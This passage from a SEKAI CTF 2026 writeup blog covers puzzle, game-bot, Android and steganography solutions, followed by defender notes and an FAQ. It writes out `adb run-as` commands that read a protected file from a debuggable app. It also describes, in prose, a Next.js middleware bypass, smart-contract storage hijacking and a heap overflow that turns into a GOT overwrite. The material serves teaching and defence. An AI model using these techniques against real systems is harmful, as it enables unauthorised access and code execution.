This is the time sink. Four pzpr-isms cost hours each on the first attempt:

* **`cell.anum + 1` for Skyscrapers/Kakuro is `value + 1`, not `value - 1 + 1`.** `anum` already holds the displayed value (1–9), so the token carries `2..10` for filled cells and `0` for empty.
* **8×8 Skyscrapers has `hasexcell = 2`,** so the canonical iteration includes a phantom column on the right and a phantom row on the bottom. The token is 81 characters long, not 64.
* **Fillomino’s border bit is `b.qans | b.isCmp()`.** With no user-drawn walls, `b.qans` is 0 and the bit reduces to `isCmp()`, which is true when the two adjacent cells have different region identity.
* **Shikaku’s `b.qans` is set to 1 on every border that separates two distinct rectangles** by pzpr’s solution checker, so the token is “1 on rectangle boundaries, 0 inside”.

#### Step 4 — Decrypt and read the heptominoes[#](#step-4--decrypt-and-read-the-heptominoes)

```
const payload = {ct, iv: "sixsevenSIXSEVEN", iter: 6767, salt: "sixseven+67="};
return sjcl.decrypt(key, JSON.stringify(payload));
```

Each secret is an ASCII heptomino with seven labelled cells:

```
Tapa        → J-shaped 7-omino  (S E K A I 6 7)
Nurikabe    → I-shaped 7-omino  ({ S E ... } K)
Fillomino   → G-shaped 7-omino
Shikaku     → S-shaped 7-omino
Skyscrapers → A-shaped 7-omino
Kakuro      → W-shaped 7-omino
```

J, I, G, S, A, W spells **JIGSAW**, the meta clue.

#### Step 5 — Solve the JIGSAW meta[#](#step-5--solve-the-jigsaw-meta)

Six pieces × seven cells = 42 cells = a 6×7 grid. The flag is the sentence you read off that grid once the heptominoes tile it (translation only, no rotation or reflection). Encode each piece as a set of `(row, col, char)` placements, enumerate all valid positions, exact-cover with CP-SAT. < 100 lines of code, solves in milliseconds:

```
SEKAI{S
CRIBBLE
_67_LIK
E_ITS_A
_SEXY_I
NTEGER}
```

Concatenated:

```
SEKAI{SCRIBBLE_67_LIKE_ITS_A_SEXY_INTEGER}
```

Per-challenge README + per-puzzle solvers + meta script: [game/6-7-puzzle-hunt](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/game/6-7-puzzle-hunt).

### Bejeweled[#](#bejeweled)

A 45-second terminal Bejeweled played over a raw TCP socket. The server is Node.js wrapping `terminal-kit`, which means alt screen + SGR mouse mode + ANSI 256-colour gem glyphs. Reaching level 6 prints the flag.

#### Step 1 — Build a virtual terminal[#](#step-1--build-a-virtual-terminal)

Maintain a 60×200 character grid. Run a reader thread that drains `recv` chunks through a single `codecs.IncrementalDecoder` (UTF-8 with `errors='replace'`), then applies every CSI cursor-move and SGR colour change. The single decoder is non-negotiable: gem glyphs are three-byte UTF-8 (`♠ = E2 99 A0`) and a single TCP-segment split mid-glyph corrupts every cell to the right by two columns. With a per-chunk decoder the corruption looked like 20% of cells reading `' '` or `�`; with an incremental decoder it is 84/84 every frame.

#### Step 2 — Parse the playfield[#](#step-2--parse-the-playfield)

The board occupies columns 16–58, rows 1–25. Each cell is six columns wide and two rows tall; the gem at `(r, c)` sits at terminal column `19 + 6·c` and terminal row `2 + 2·r`. Sample those 84 positions every frame for the 12×7 array of `'♢●◼♡♠▲▣'`.

#### Step 3 — Track selection state[#](#step-3--track-selection-state)

Clicking a cell replaces `│ X │` with `│[ X ]│`. Any frame with a `[` anywhere on a gem row means the swap has not committed yet; refuse to read the board in that state to avoid sending a second click against a stale snapshot.

```
def has_selection(self):
    for r in range(ROWS):
        gy = 2 + 2 * r
        for c in range(COLS):
            if self.grid[gy - 1][16 + 6 * c] == "[":
                return True
    return False
```

#### Step 4 — Pick the swap with a bottom-row bias[#](#step-4--pick-the-swap-with-a-bottom-row-bias)

Per candidate swap, materialise the swapped board, count matched cells, and score:

```
key = 100 * len(matched) + avg_row   # length dominates, then bottom-row
```

Pure “most cells matched” climbs to level 4 reliably. Adding the bottom-row tiebreaker (cleared gems near the floor trigger longer cascades) pushes the bot reliably past level 5. The cascade bonuses, not the per-move match count, are what get the score over 12 500 in 45 seconds.

#### Step 5 — Pace the moves[#](#step-5--pace-the-moves)

Send both clicks of a swap in one `sendall()`. After that, wait up to 180 ms, polling the board every 8 ms, break the instant the board differs from the pre-swap snapshot AND no cell is in the selected state. That yields ~100–110 processed swaps per game.

#### Step 6 — Catch the win-screen flag[#](#step-6--catch-the-win-screen-flag)

The big trap: the **time-out** screen and the **win** screen are different layouts. Time-out leaves row 13 blank, so a dumper that filters by the time-out template never sees the flag. Win renders the flag string directly on row 13.

The fix is to grep every row for `SEKAI\{...\}` continuously throughout the game, not only on a post-game template match. As soon as the bot crests level 6, the next frame’s row 13 contains:

```
!!! FLAG FOUND on row 13: SEKAI{th3_l4st_d4nc3_By_eana}
```

Roughly one in two or three bot runs reaches level 6 in 45 seconds, so a short retry loop is the right “solver”:

```
while true; do
  python3 solve.py | tee run.log
  grep -m1 -o 'SEKAI{[^}]\+}' run.log && break
done
```

Per-challenge README and full bot: [game/bejeweled](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/game/bejeweled).

## Misc[#](#misc)

### SekaiID[#](#sekaiid)

Two Android APKs: `SekaiID.apk` (a “digital conference badge” wallet) and `Verifier.apk` (the scanner / dashboard). The instructions ask you to “create a working exploit application (.apk)” and the manifest surface invites a chain of intent redirection + provider grant + claims-tag forgery. The actual primitive on the shipped APKs is one line.

#### Step 1 — Find where the flag lives[#](#step-1--find-where-the-flag-lives)

Decompiling `AdminDashboardActivity` shows it renders an “Issuer recovery material” field whose contents come from `IssuerRecoveryProvider`:

```
.class public final Lcom/sekai/verifier/system/IssuerRecoveryProvider;
.field public static final DEFAULT_PATH:Ljava/lang/String; = "/system/flag.txt"
# read-d1pmJ48():
#   File("/system/flag.txt").readText().trim()
```

So the flag is the contents of `/system/flag.txt`. The intended path is: register an attacker activity for `ACTION_PRESENT_CREDENTIAL`, leak the pairing fingerprint through the exported `CompanionInfoProvider`, forge a `claimsTag` HMAC, return a `Presentation` whose `accessProfile` resolves to `ADMIN`, watch the AdminDashboard render the file. That is a respectable 100-point Android challenge.

#### Step 2 — Read the file permissions[#](#step-2--read-the-file-permissions)

```
$ adb shell ls -la /system/flag.txt
-rw------- 1 u0_a150 u0_a150 33 2026-06-28 00:46 /system/flag.txt
```

Mode `0600`, owner UID `u0_a150`. The `shell` user (UID 2000) cannot read it directly. But the owner UID belongs to `com.sekai.verifier` (`dumpsys package` confirms).

#### Step 3 — Use the debuggable shortcut[#](#step-3--use-the-debuggable-shortcut)

Both manifests ship with `android:debuggable="true"`. On any Android build, a debuggable package is reachable via `run-as`, which switches the calling UID to that package’s UID and reuses its SELinux domain:

```
adb shell run-as com.sekai.verifier cat /system/flag.txt
```

```
SEKAI{welcome-to-the-conference!}
```

No exploit APK, no intent juggling, no provider grants. `android:debuggable="true"` on a shipping app is the entire CVE.

#### Step 4 — Wire up the TLS proxy[#](#step-4--wire-up-the-tls-proxy)

The instancer endpoint is TLS-wrapped. `tls_proxy.py` from the handout exposes the per-instance ADB as plain TCP on `127.0.0.1:5555`:

```
python3 handout/tls_proxy.py sekaiid-XXXXXXXXXXXXXX.instancer.sekai.team 1337 &
adb connect 127.0.0.1:5555
adb shell am start -n com.sekai.id/.MainActivity        # provision the wallet
adb shell am start -n com.sekai.verifier/.MainActivity  # register the verifier UID
adb shell run-as com.sekai.verifier cat /system/flag.txt
```

Per-challenge README + one-shot wrapper: [misc/sekaiid](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/misc/sekaiid).

The intended IPC hardening (an explicit `setPackage("com.sekai.id")` on the Verifier’s outgoing intent, plus rejecting `FLAG_ACTIVITY_FORWARD_RESULT` in the IdentityProviderActivity’s caller check) would also have blocked the longer attack path. But `android:debuggable="false"` alone closes the entire `run-as` route, which is by far the cheapest fix.

### impossible stego[#](#impossible-stego)

Two handout files: `flag.png` (the carrier) and `messages.log` (a 23 MB newline-delimited JSON log). The “impossible” framing is the source-control mistake: the log captures the author’s Claude session at sekai.team’s Anthropic API gateway, and the gateway records both `req_body` and `resp_body` for every turn.

#### Step 1 — Recognise the AI-gateway log format[#](#step-1--recognise-the-ai-gateway-log-format)

```
import base64, json
entry = json.loads(open("messages.log").readlines()[-1])
body  = json.loads(base64.b64decode(entry["req_body"]))
messages = body["messages"]    # 114 messages
```

The Anthropic Messages API echoes the full conversation history on every turn, so the largest (last) `POST /v1/messages` body holds every prior message, including every `Write` and `Edit` tool call the assistant issued while writing the stego package.

#### Step 2 — Replay every `Write` and `Edit`[#](#step-2--replay-every-write-and-edit)

```
def reconstruct(messages):
    fs = {}
    for m in messages:
        for block in (m.get("content") or []):
            if block.get("type") != "tool_use": continue
            inp = block.get("input", {})
            path = inp.get("file_path", "")
            if block["name"] == "Write":
                fs[path] = inp["content"]
            elif block["name"] == "Edit":
                old, new = inp.get("old_string",""), inp.get("new_string","")
                count = -1 if inp.get("replace_all") else 1
                if path in fs and old in fs[path]:
                    fs[path] = fs[path].replace(old, new, count)
    return fs
```

For this transcript that recovers 20 files totalling ~33 KB across six directories: `stego/__init__.py`, `stego/{bits, pipeline, secret}.py`, `stego/coding/{frame, sbox, whiten}.py`, `stego/crypto/{chacha20, csprng, kdf, mac}.py`, `stego/image/{carrier, embed, scatter}.py`, and an `__main__.py`.

#### Step 3 — Note the baked-in secret[#](#step-3--note-the-baked-in-secret)

`stego/secret.py` contains the 64-byte `ROOT_SECRET`, the S-box seed, and the HKDF extract/expand salts. The stego scheme itself is reasonably strong (ChaCha20 + keyed S-box + position-dependent whitening + truncated HMAC + multi-round keyed scatter + matched-LSB embedding, all HKDF-derived per image dimensions). It is not weak; it is unhidden.

#### Step 4 — Run the recovered package against the carrier[#](#step-4--run-the-recovered-package-against-the-carrier)

```
python3 exploit/solve.py
```

The solver reads the log, rebuilds the source tree into a temp dir, imports the package, and calls `stego.extract(flag.png)`:

```
SEKAI{th3y_d1dn7_4ctually_l3t_m3_us3_my7h0s_f0r_7h1s_0n3_s4dly_i_h4d_i7_r3r0ut3d_t0_0pus}
```

The flag itself is the punchline: the author’s request was rerouted from sekai.team’s in-house “Mythos” model to public Anthropic Opus, which is exactly why the session showed up in the AI-gateway log we just read. The challenge description’s “er, i mean claude did” was already telling us; the flag confirms the bookkeeping.

Per-challenge README + log-to-source-to-extract solver: [misc/impossible-stego](https://github.com/Abdelkad3r/SekaiCTF-2026/tree/main/misc/impossible-stego).

## Cross-cutting defender notes[#](#cross-cutting-defender-notes)

Six patterns recur across SEKAI CTF 2026 and translate directly into production code review.

**UUID-scoped APIs don’t make state UUID-scoped.** Open World’s launcher gives each instance its own API endpoint but lets the underlying TON economy share addresses. Any “isolation” boundary that is enforced at one layer (HTTP routing, JWT scope, application logic) and not at the layer below it (database keyspaces, on-chain balances, filesystem ownership) is not isolation. The right tests for this kind of bug are not unit tests of any single layer; they are end-to-end tests where two instances are spun up and one is given the credentials of the other to see what cross-state remains reachable.

**`call`-before-`SSTORE` is reentrancy.** PP Farming is the textbook bug, almost three decades old in some form, and still ships into production. The mechanical fix is to write the state change before the external call, but the more durable practice is to (1) use OpenZeppelin’s `ReentrancyGuard` modifier on any function that does an external `call`, `send`, or `transfer` to an attacker-controllable address, and (2) include a static linter (slither, mythril) in CI that flags the pattern at PR time. The lint catches the bug before review fatigue does.

**Storage layouts of `delegatecall` targets are shared state.** PP Farming 2 is the more interesting failure mode: the patch added a reentrancy guard and a delegate-call helper. The reentrancy guard worked, the helper’s layout was deliberately aligned with the ATM’s, and an unguarded `setATM` mutator reached through the proxy let an attacker hand themselves the `processor` slot. Whenever a contract `delegatecall`s an external address, the storage layout of the callee is part of the caller’s storage layout, and every public mutator on the callee that touches an aligned slot is an attacker-controlled write. The right review checklist: confirm the callee’s storage is either empty (a pure-logic library) or laid out to never collide with the caller’s, and confirm every public mutator on the callee has its own access control.

**Framework routing layers don’t agree about anything.** Migurimental composes three trust-boundary disagreements: middleware versus page on `id` (broken by `nxtP` query prefixes), middleware versus page on cookies (broken by duplicate cookie names), middleware matcher versus asset-prefix rewrite (broken because the rewrite happens after the matcher decided not to run). Any Next.js / Express / Fastify / Rails app that protects sensitive routes only through middleware needs a clear answer to “what is the canonical request representation the matcher will see, and is it the same one every handler downstream sees?” When the answer is “no” or “yes for most of them,” the matcher is not an authorisation boundary.

**`shell=False` and length validation are the AFC bug’s fix.** The pinned `libimobiledevice` parser allocates `entire_length` and reads `this_length` with no check that `this_length <= entire_length`. The fix is one line, and the invariant is a one-line comment: `sizeof(AFCPacket) <= this_length <= entire_length`. The deeper lesson is that any protocol parser that reads two related length fields needs an explicit comparison between them before either is used for memory allocation or buffer access. The author-of-the-pinned-version may have been a famous open-source project; that does not protect downstream consumers.

**`android:debuggable="true"` is one attribute.** SekaiID’s intended chain was a 100-point Android IPC puzzle, and the shipped artefact short-circuits to `adb run-as`. The lesson for app authors is that Android’s debuggable attribute is a compile-time switch the build tool should refuse to ship in any non-debug variant: Gradle’s `release` build type has `debuggable = false` by default, and Play Store rejection rules also catch it. For CTF authors, the lesson is that demo apps are uniquely vulnerable to ship-the-wrong-build mistakes.

**AI-gateway logs that capture `req_body` and `resp_body` capture the full source history.** The Anthropic Messages API repeats every prior message on every turn. A gateway that records both bodies records every `Write` and `Edit` tool call the assistant made, in order. The defensive review for a deployment that fronts model traffic with an audit gateway: if the audit log contains the prompt and the model’s tool output, the gateway is also a source-control system, and its retention and access policies should match whatever protects the source tree it captures.

## Frequently asked questions[#](#frequently-asked-questions)

### What is SEKAI CTF 2026?[#](#what-is-sekai-ctf-2026)

SEKAI CTF is a major annual Jeopardy-style CTF run by Project SEKAI. The 2026 edition shipped challenges across blockchain (Ethereum and TON), cryptography, web, pwn, reverse engineering, game, and miscellaneous tracks. The flag prefix is `SEKAI{...}`. The eleven challenges covered in this writeup are mirrored with per-challenge READMEs, artifacts, and full solver scripts at [Abdelkad3r/SekaiCTF-2026](https://github.com/Abdelkad3r/SekaiCTF-2026).

### How do you solve Open World on TON when one instance does not have enough resources?[#](#how-do-you-solve-open-world-on-ton-when-one-instance-does-not-have-enough-resources)

Use two instances. The launcher’s per-UUID API endpoint is the only thing that is actually scoped; the underlying TON wallets share one chain and one economy. Spin up a donor instance, claim its free 50-jetton `PlayerBonus`, sell those jettons back to the donor challenge contract for ~100 TON, then transfer that TON to a fresh target instance’s wallet. The target instance claims its own 50-jetton bonus, uses the donor TON to buy 50 more jettons, and finally sends 100 jettons to its own challenge wallet with a `Solve` forward payload. The transfer originates from the target’s own wallet so it passes the `transferInitiator == storage.player` check, and the contract has no view into where the TON came from.

### What is the bug in PP Farming 2 if the reentrancy guard works?[#](#what-is-the-bug-in-pp-farming-2-if-the-reentrancy-guard-works)

The reentrancy guard does work; the bug is somewhere else entirely. The “fix” refactors withdrawal through a helper called via `delegatecall`, and the patched ATM has a `fallback()` that forwards every selector except `processWithdrawal` to that helper. The helper’s storage layout is deliberately aligned (a `uint256 _gap` in slot 0 followed by `address atm` in slot 1 bytes 0..19) with the ATM’s `processor` field at the same offset. The helper exposes `setATM(address)` with no access control. Reaching `setATM` through the ATM’s transparent fallback writes the attacker’s address into the ATM’s `processor` slot. The next `withdrawPP()` call then `delegatecall`s the attacker’s contract in the ATM’s storage context, and a one-line `processWithdrawal(address,uint256)` body forwards `address(this).balance` to the player.

### How does the oneline6ryp7o flag get pinned down with `2^67 - 1`?[#](#how-does-the-oneline6ryp7o-flag-get-pinned-down-with-267---1)

The modulus `M = 2^67 - 1` has the special property that `2^67 ≡ 1 (mod M)`, so powers of two wrap every 67 bits. Each candidate flag character sits at a byte position `k` from the right, contributing `2^(8k) mod M` to the residue if flipped from `6` to `7`. Because `gcd(8, 67) = 1`, the map `k → 8k mod 67` is a permutation of `{0, 1, ..., 66}`. So the 67 unknown characters each independently control exactly one bit of the residue modulo `M`. Compute the bitmask `target = (-base_value) % M`, then for each position flip the character to `7` if the corresponding bit of `target` is 1.

### How does the `nxtPid` trick in Migurimental bypass the middleware id check?[#](#how-does-the-nxtpid-trick-in-migurimental-bypass-the-middleware-id-check)

`nxtP` is an internal Next.js query prefix. When a request URL contains `?nxtPid=<value>`, the Next.js routing pipeline normalises it into `id=<value>` early enough that the middleware reading `request.nextUrl.searchParams.get('id')` sees the normalised value. The `getServerSideProps` on the page, however, runs later in the pipeline against the original query, so it reads the literal `id` parameter. Sending `?nxtPid=<your-id>&id=1` makes the middleware see your own id (passes the per-user access-card check) while the page renders the access card for id 1 (Miku) and leaks her ticket UUID inside the QR code.

### What is the ppp AFC bug and how does it become a GOT overwrite?[#](#what-is-the-ppp-afc-bug-and-how-does-it-become-a-got-overwrite)

`afc_receive_data()` in the pinned `libimobiledevice` allocates `entire_length` bytes and then reads `this_length` bytes into the buffer without checking that `this_length <= entire_length`. The challenge wrapper talks to an attacker-controlled fake AFC device over the network, so the player can send any header. Stage 1: send a normal `ls /` that creates and frees a `0x110` data chunk and a freed `0x20` tcache list-vector chunk. Stage 2: send a malformed `mkdir /x` with `this_length = entire_length + 8`, overflowing the data chunk by 8 bytes onto the freed list-vector’s tcache `next`, which is replaced with `puts@GOT - 8`. Stage 3: send a final `ls /` whose first directory entry is the desired shell command and whose second entry’s bytes overwrite `puts@GOT` with libc `system`. The wrapper’s `puts(list[0])` becomes `system("/readflag sekai ppp ...")`.

### What does Untitled Encore actually validate before printing the flag?[#](#what-does-untitled-encore-actually-validate-before-printing-the-flag)

Three layers. (1) The chart-format parser rejects invalid notes (lane/kind/parity/byte-range checks) and accumulates four 32-bit aggregate state words, five lane sums, three kind sums, and a 25-bit coverage mask whose final values must match constants in the binary. (2) An embedded eBPF ELF in `.rdata` is extracted and its `.rodata` decoded to a 388-byte verifier program (each instruction XORed with a per-PC keystream). The verifier runs 20 direct chart-byte equality checks plus marker checks. (3) The chart and a generated 32-byte block are fed to the eBPF VM and the VM output is compared against a stored 32-byte target. Only after all three pass is the final flag key derived from a custom 32-byte hash (Unicorn-emulated) of the aggregate state, the VM output, and the chart, then used as a ChaCha-like stream cipher to decrypt a 22-byte embedded ciphertext.

### Why is the Bejeweled flag on a different row than the time-out screen suggests?[#](#why-is-the-bejeweled-flag-on-a-different-row-than-the-time-out-screen-suggests)

The Bejeweled server renders two different end-screen layouts. The time-out template (when 45 seconds elapse before level 6) leaves row 13 blank; the win template (when level 6 is reached in time) puts the flag string on row 13. A naive end-of-game dumper that filters by the time-out template’s layout never sees the flag. The fix is to grep every row for `SEKAI\{...\}` continuously while the game is running, not only on a post-game template match. The bot itself needs a bottom-row-biased move picker to crest level 6 reliably, but the flag-recovery half is layout-aware.

### What is the SekaiID short circuit and why is it the entire CVE?[#](#what-is-the-sekaiid-short-circuit-and-why-is-it-the-entire-cve)

Both APKs ship with `android:debuggable="true"` in their manifests. The flag file at `/system/flag.txt` is owned by the Verifier app’s UID (mode `0600`). On any Android build, a debuggable package is reachable via `adb shell run-as <package>`, which switches the calling UID to the package’s UID and reuses its SELinux domain. So `adb shell run-as com.sekai.verifier cat /system/flag.txt` reads the file directly. The intended attack chain is a respectable Android-IPC + claims-tag-forgery puzzle, but the debuggable attribute closes it in one line.

### How does the impossible stego solver rebuild the algorithm from the log?[#](#how-does-the-impossible-stego-solver-rebuild-the-algorithm-from-the-log)

The handout’s `messages.log` is the author’s Claude session captured at sekai.team’s Anthropic API gateway. The Anthropic Messages API echoes the full conversation history on every turn, so the last `POST /v1/messages` body contains every prior message, including every `Write` and `Edit` tool call the assistant made while writing the stego package. Replay the `Write` tool calls (each is `{file_path, content}`) to build the file tree, then apply each `Edit` (`{file_path, old_string, new_string, replace_all}`) in order to update files in place. The reconstructed `stego/` package contains `stego/secret.py` with the 64-byte `ROOT_SECRET`, the S-box seed, and the HKDF salts baked in. Calling `stego.extract(flag.png)` decodes the LSB-embedded payload and returns the flag.

### What’s the broader lesson from the SEKAI CTF 2026 track?[#](#whats-the-broader-lesson-from-the-sekai-ctf-2026-track)

Each challenge enumerates a sequence of supposed gates and one of them does not actually exist. The skill is enumeration: list every supposed authorisation check, every supposed isolation boundary, every supposed input validation, then walk them. For PP Farming 2 it is the helper’s storage layout colliding with the ATM’s. For Migurimental it is the asset-prefix rewrite happening after the matcher. For SekaiID it is `debuggable="true"`. For impossible stego it is the AI gateway logging the assistant’s tool calls. The pattern repeats in production code review: “real” CVEs almost always live in the gate the author thought they had closed.

### Where can I find the solver scripts?[#](#where-can-i-find-the-solver-scripts)

Per-challenge READMEs and full solver scripts (Solidity exploits, Python + Node solvers, Foundry scripts, Unicorn emulator harnesses) are at [Abdelkad3r/SekaiCTF-2026](https://github.com/Abdelkad3r/SekaiCTF-2026). Each challenge directory contains a self-contained `exploit/` (solver) and `handout/` (original artefacts) tree, with the README walking the reasoning end-to-end.

## Closing notes[#](#closing-notes)

Eleven challenges across blockchain, crypto, web, pwn, reverse, game, and misc, each isolating a different primitive. The throughline is that almost every challenge ships an intended attack path that takes hours and a shorter path that takes minutes. Both are documented in the per-challenge READMEs because the long paths are educational even when they are not the winning move: PP Farming 2’s intended path is reading the bytecode of two contracts and finding the storage collision; SekaiID’s intended path is a real Android-IPC + claims-tag forgery chain; Migurimental’s three composing bypasses are individually worth seeing.

For more CTF writeups in this series, see the [V1t CTF 2026 master writeup](https://cybersecurityelite.com/ctf-writeups/v1t-ctf-2026-writeup/) covering eight challenges across crypto/reverse/web/misc, the [TraceBash CTF 2026 crypto writeup](https://cybersecurityelite.com/ctf-writeups/tracebash-ctf-2026-crypto-writeup/) and [pwn writeup](https://cybersecurityelite.com/ctf-writeups/tracebash-ctf-2026-pwn-writeup/) for ZUC and badchars-ROP material, and the [Anti-Slop CTF 2026 web writeup](https://cybersecurityelite.com/ctf-writeups/anti-slopctf-2026-web-writeup/) and [reverse writeup](https://cybersecurityelite.com/ctf-writeups/anti-slopctf-2026-reverse-writeup/) for adjacent Next.js and binary RE patterns. The [GPN CTF 2026 master writeup](https://cybersecurityelite.com/ctf-writeups/gpn-ctf-2026-writeup/) walks a similar mix of categories. The full [CTF writeups index](https://cybersecurityelite.com/ctf-writeups/) is the home for everything else.

### Join the CyberSecurity Elite newsletter

Weekly writeups, tools, and tactics — straight to your inbox. No spam, unsubscribe anytime.

Email address

Subscribe